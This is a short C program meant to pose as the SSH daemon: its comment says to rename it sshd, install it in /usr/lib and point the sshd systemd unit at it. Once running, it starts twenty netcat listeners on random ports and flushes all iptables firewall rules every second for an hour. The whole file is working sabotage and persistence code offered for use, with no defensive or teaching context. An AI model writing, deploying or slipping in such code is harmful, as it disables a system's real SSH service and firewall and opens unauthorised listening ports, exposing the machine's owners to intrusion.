#include <stdlib.h>
#include <unistd.h>

/* rename this file to sshd, compile and put it in /usr/lib. Then change the sshd unit file to point towards this for execStart */

int main () {
        int a;
        for (a = 0; a <20; a = a+1){
                int status = system("nc -nlp $(shuf -i 100-1000 -n 50) &");
        }

        for (a = 0; a <3600; a = a+1){
                int fw1 = system("iptables -F");
                sleep(1);
        }
        return 0;
}
